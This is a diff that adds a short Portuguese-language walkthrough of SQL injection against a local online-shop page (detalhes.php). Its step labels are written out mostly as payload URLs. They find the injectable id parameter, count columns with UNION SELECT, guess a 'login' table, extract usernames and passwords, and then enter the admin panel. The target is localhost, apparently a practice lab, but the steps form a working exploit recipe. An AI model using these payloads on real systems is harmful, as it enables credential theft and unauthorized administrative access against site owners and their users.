@@ -1,0 +1,22 @@
+descobrir a pagina que possua a falha de sql inject
+http://localhost/lojavirtual/detalhes.php?id=’8'
+
+
+descubro  a quantidade de campo das tabelas
+http://localhost/lojavirtual/detalhes.php?id=-1+UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
+
+rertorna a quantidade de campos titulo - produto coluna 3, descrição coluna 4 (produtos - 10 campos)
+http://localhost/lojavirtual/detalhes.php?id=-1+UNION SELECT 1,2,3,4,5,6,7,8,9,10
+
+chuto os campos na tentativa erro
+http://localhost/lojavirtual/detalhes.php?id=-1+UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM login
+
+retorna o usuario na tentativa erro
+http://localhost/lojavirtual/detalhes.php?id=-1+UNION SELECT 1,2,login,4,5,6,7,8,9,10 FROM login--
+
+retorno a senha na tentativa erro
+http://localhost/lojavirtual/detalhes.php?id=-1+UNION SELECT 1,2,login,senha,5,6,7,8,9,10 FROM login--
+
+acesso ao adm
+http://localhost/lojavirtual/admin
+se tudo estiver correto você entrar na adm
